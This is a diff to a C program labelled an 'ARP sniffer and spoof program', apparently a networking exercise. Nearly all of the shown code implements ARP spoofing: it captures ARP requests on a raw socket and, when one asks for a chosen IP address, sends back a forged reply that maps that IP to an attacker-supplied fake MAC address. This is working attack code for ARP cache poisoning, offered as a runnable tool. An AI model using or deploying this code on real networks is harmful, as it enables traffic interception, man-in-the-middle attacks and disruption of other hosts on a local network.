@@ -262,94 +262,110 @@ int main(int argc, char **argv){
 			}
 
 			//generate fake MAC address
-			else if(!strcmp(argv[1], "00:11:22:33:44:55")){
+			else if(!strcmp(argv[1],"00:11:22:33:44:55"))
+			{	
+
 				printf("[ ARP sniffer and spoof program ]\n");
 				printf("### ARP spoof mode ###\n");
-
-				//error detection
-				if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0){
+				if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
+				{
 					perror("open recv socket error");
 					exit(1);
 				}
+				if(strlen(argv[2])>= 7 && strlen(argv[2]) <= 15)
+				{		
 
-				//determine whether the IP address is valid
-				if(strlen(argv[2]) >= 7 && strlen(argv[2]) <= 15){
-					while(1){
-						//error detection
-						if(recv_length = recvfrom(sockfd_recv, (void *)&arp_packet_recv, sizeof(struct arp_packet), 0, NULL, NULL) < 0){	
+					while(1)
+			        {
+						if(recv_length = recvfrom( sockfd_recv, (void *)&arp_packet_recv, sizeof(struct arp_packet), 0, NULL, NULL)<0)
+						{	
 							perror("recvfrom");
 							exit(1);
 						}
 
-						//set source and destination host hardware address
-						ether_aton_r(recv_SHWA, &Dst_haddr);
-						memcpy(&arp_packet_send.eth_hdr.ether_dhost, &Dst_haddr,ETH_HALEN); //ethernet destination MAC
+						memcpy(arp_packetR,(void *)&arp_packet_recv, sizeof(struct arp_packet)); 
+						if((arp_packetR[12]==8 && arp_packetR[13]==6))// filter arp_packet 
+						{
+							memcpy(recv_SHA,get_sender_hardware_addr(&arp_packet_recv.arp),32);
+							strcpy(recv_SPA,get_sender_protocol_addr(&arp_packet_recv.arp));
+							strcpy(recv_TPA,get_target_protocol_addr(&arp_packet_recv.arp));
 
-						ether_aton_r(argv[1], &Src_haddr);
-						memcpy(&arp_packet_send.eth_hdr.ether_shost, &Src_haddr,ETH_HALEN); //ethernet source MAC
+							if (!strcmp(argv[2], recv_TPA))
+							{
+								if((sockfd_send = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
+								{
+									perror("open send socket error");
+									exit(1);
+								}
+								ether_aton_r(recv_SHA, &Dst_haddr);
+								memcpy(&arp_packet_send.eth_hdr.ether_dhost, &Dst_haddr,ETH_HALEN);//ethernet dst MAC
+								ether_aton_r(argv[1], &Src_haddr);
+								memcpy(&arp_packet_send.eth_hdr.ether_shost, &Src_haddr,ETH_HALEN);//ethernet src MAC
+								arp_packet_send.eth_hdr.ether_type = htons(ETHERTYPE_ARP);
 
-						arp_packet_send.eth_hdr.ether_type = htons(ETHERTYPE_ARP);
+								set_hard_type(&arp_packet_send.arp, htons(ARP_HRD_ETHER));
+								set_prot_type(&arp_packet_send.arp, htons(ETHERTYPE_IP));
+								set_hard_size(&arp_packet_send.arp, ETH_HALEN);
+								set_prot_size(&arp_packet_send.arp, ETH_PALEN);
+								set_op_code(&arp_packet_send.arp, htons(ARP_OP_REPLY));//change to op_reply
 
-						//set hard type, prot type, hard size, prot type and op code
-						set_hard_type(&arp_packet_send.arp, htons(ARP_HRD_ETHER));
-						set_prot_type(&arp_packet_send.arp, htons(ETHERTYPE_IP));
-						set_hard_size(&arp_packet_send.arp, ETH_HALEN);
-						set_prot_size(&arp_packet_send.arp, ETH_PALEN);
-						set_op_code(&arp_packet_send.arp, htons(ARP_OP_REPLY));
+								ether_aton_r(argv[1], &Arp_Src_haddr);
+								memcpy(&arp_packet_send.arp.arp_sha, &Arp_Src_haddr,ETH_HALEN);//sender hardware addr (fake)
 
-						//sender fake hardware address 
-						ether_aton_r(argv[1], &Arp_Src_haddr);
-						memcpy(&arp_packet_send.arp.arp_sha, &Arp_Src_haddr,ETH_HALEN);
+								Arp_Src_IP = inet_addr(recv_TPA);
+								memcpy(&arp_packet_send.arp.arp_spa, &Arp_Src_IP,ETH_PALEN);
 
-						//set source ip
-						Arp_Src_IP = inet_addr(recv_TIPA);
-						memcpy(&arp_packet_send.arp.arp_spa, &Arp_Src_IP,ETH_PALEN);
+								ether_aton_r(recv_SHA, &Arp_Dst_haddr);
+								memcpy(&arp_packet_send.arp.arp_tha, &Arp_Dst_haddr,ETH_HALEN);
 
-						//real hardware address
-						ether_aton_r(recv_SHWA, &Arp_Dst_haddr);
-						memcpy(&arp_packet_send.arp.arp_tha, &Arp_Dst_haddr,ETH_HALEN);
+								Arp_Dst_IP = inet_addr(recv_SPA);
+								memcpy(&arp_packet_send.arp.arp_tpa,&Arp_Dst_IP ,ETH_PALEN);
 
-						//set target IP
-						Arp_Dst_IP = inet_addr(recv_SIPA);
-						memcpy(&arp_packet_send.arp.arp_tpa,&Arp_Dst_IP ,ETH_PALEN);
 
-						//request setting
-						memset(&req, 0, sizeof(req));
-						strcpy(req.ifr_name, DEVICE_NAME);
-						
-						//error detection
-						if((ioctl(sockfd_send,SIOCGIFINDEX,&req)) < 0 ){
-							perror("SIOCGIFINDEX\n");
-							exit(1);
+								memset(&req,0,sizeof(req));
+								strcpy(req.ifr_name,DEVICE_NAME);
+				
+								if((ioctl(sockfd_send,SIOCGIFINDEX,&req)) < 0 )
+								{
+									perror("SIOCGIFINDEX\n");
+									exit(1);
+								}
+
+								bzero(&sa,sizeof(sa));
+								sa.sll_family = AF_PACKET;
+								sa.sll_ifindex = req.ifr_ifindex;
+								sa.sll_halen = ETH_HALEN;
+								sa.sll_protocol = htons(ETH_P_ARP);
+								memcpy(sa.sll_addr,recv_SHA,ETH_HALEN);
+
+								if((sendto(sockfd_send,&arp_packet_send,sizeof(arp_packet_send),0,(struct sockaddr *)&sa,sizeof(sa))) < 0)
+								{
+									perror("sendto");
+								}
+
+								else
+								{
+									printf("Get ARP packet - who has %s ? \t Tell %s \n",recv_TPA,recv_SPA);
+									printf("send ARP reply : %u.%u.%u.%u is %02x:%02x:%02x:%02x:%02x:%02x\n",
+			                       arp_packet_send.arp.arp_spa[0], 
+			                       arp_packet_send.arp.arp_spa[1], 
+			                       arp_packet_send.arp.arp_spa[2], 
+			                       arp_packet_send.arp.arp_spa[3],
+			                       arp_packet_send.arp.arp_sha[0], 
+			                       arp_packet_send.arp.arp_sha[1], 
+			                       arp_packet_send.arp.arp_sha[2], 
+			                       arp_packet_send.arp.arp_sha[3], 
+			                       arp_packet_send.arp.arp_sha[4], 
+			                       arp_packet_send.arp.arp_sha[5]);
+									printf("send sucessful.\n");
+								}
+
+								break;
+							}
 						}
-
-						bzero(&sa,sizeof(sa)); //init
-						//connect to socket
-						sa.sll_family = AF_PACKET;
-						sa.sll_ifindex = req.ifr_ifindex;
-						sa.sll_halen = ETH_HALEN;
-						sa.sll_protocol = htons(ETH_P_ARP);
-						memcpy(sa.sll_addr,recv_SHWA,ETH_HALEN);
-
-						if((sendto(sockfd_send, &arp_packet_send,sizeof(arp_packet_send), 0, (struct sockaddr *)&sa, sizeof(sa))) < 0){
-							perror("sendto");
-						}
-
-						else{
-							printf("Get ARP packet - who has %s ? \t Tell %s \n", recv_TIPA, recv_SIPA);
-							printf("send ARP reply : %u.%u.%u.%u is %02x:%02x:%02x:%02x:%02x:%02x\n",
-							arp_packet_send.arp.arp_spa[0], 
-							arp_packet_send.arp.arp_spa[1],
-							arp_packet_send.arp.arp_spa[2], 
-							arp_packet_send.arp.arp_spa[3],
-							arp_packet_send.arp.arp_sha[0], 
-							arp_packet_send.arp.arp_sha[1], 
-							arp_packet_send.arp.arp_sha[2], 
-							arp_packet_send.arp.arp_sha[3], 
-							arp_packet_send.arp.arp_sha[4], 
-							arp_packet_send.arp.arp_sha[5]);
-							printf("send sucessful.\n");
-						}
+					}
+				}		
+			}
 
 						break;
 					}
